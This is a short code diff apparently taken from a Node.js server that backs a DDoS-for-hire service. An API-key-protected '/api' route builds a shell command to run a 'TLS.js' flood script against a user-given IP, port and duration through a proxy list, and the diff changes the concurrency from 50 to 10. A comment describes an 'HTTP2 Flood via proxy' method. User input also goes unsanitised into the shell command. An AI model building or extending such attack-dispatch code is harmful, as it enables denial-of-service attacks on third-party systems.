@@ -183,7 +183,7 @@ app.get('/api', verifyApiKey, async (req, res) => {
         if (!fs.existsSync(scriptPath)) {
             return res.status(404).json({ error: 'TLS.js not found' });
         }
-        const concurrent = 50;
+        const concurrent = 10;
         command = `node ${scriptPath} ${ip} ${parsedPort} ${PROXY_FILE} ${concurrent} ${parsedTime}`;
 
         // Method TLSV2 (HTTP2 Flood via proxy with stable reconnect)
